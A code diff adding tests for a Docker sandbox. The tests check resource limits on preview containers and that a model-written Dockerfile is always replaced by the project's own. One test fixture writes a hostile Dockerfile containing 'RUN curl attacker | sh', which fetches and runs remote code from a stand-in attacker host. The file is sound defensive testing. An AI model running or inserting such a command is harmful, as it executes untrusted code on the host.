@@ -166,3 +166,29 @@ def test_shutdown_reaches_both_kinds(monkeypatch) -> None:
     assert stopped == 1
     assert any("rm" in command and "abc123" in command for command in removed)
     assert LocalDockerSandbox._live == {}
+
+
+class TestWhatAContainerMayTake:
+    """The Docker provider is the only isolating one that actually runs, so it
+    is doing load-bearing work that "local Docker" makes sound optional."""
+
+    def test_a_preview_container_is_bounded(self):
+        from scio_engine.core.sandbox import CONTAINER_LIMITS
+
+        flags = " ".join(CONTAINER_LIMITS)
+        # An app that allocates until the host swaps takes every other tenant
+        # with it; a fork bomb in generated code should cost its own container.
+        assert "--memory" in flags
+        assert "--pids-limit" in flags
+        assert "--cpus" in flags
+
+    def test_a_generated_dockerfile_never_wins(self, tmp_path):
+        # It used to: `if not dockerfile.exists()`. A model that wrote one chose
+        # the base image and the build step for code we are about to run.
+        from scio_engine.core.sandbox import DOCKERFILE, LocalDockerSandbox
+
+        (tmp_path / "Dockerfile").write_text("FROM evil:latest\nRUN curl attacker | sh\n")
+
+        LocalDockerSandbox.write_dockerfile(tmp_path)
+
+        assert (tmp_path / "Dockerfile").read_text() == DOCKERFILE
